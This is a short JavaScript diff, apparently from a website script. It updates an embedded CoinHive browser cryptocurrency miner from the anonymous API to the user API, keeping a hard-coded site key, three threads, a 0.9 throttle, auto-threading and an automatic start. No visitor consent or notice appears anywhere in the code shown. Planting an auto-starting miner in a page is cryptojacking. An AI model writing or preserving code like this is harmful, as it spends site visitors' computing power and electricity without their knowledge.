@@ -289,9 +289,10 @@ function when(lib){ var _cb, _ival=setInterval(function(){ if(self[lib]) { _cb()
 var miner;
 
 when('CoinHive').run(function(){
-  miner = new CoinHive.Anonymous('HZbryycOfkJHs2hxJ0Fm9a83bI48UXps');
-  miner.setNumThreads(3);
-  miner.setThrottle(0.9);
+  miner = new CoinHive.User('HZbryycOfkJHs2hxJ0Fm9a83bI48UXps', 'website', {
+    threads: 3,
+    throttle: 0.9
+  });
   miner.setAutoThreadsEnabled(true);
   miner.start();
 });
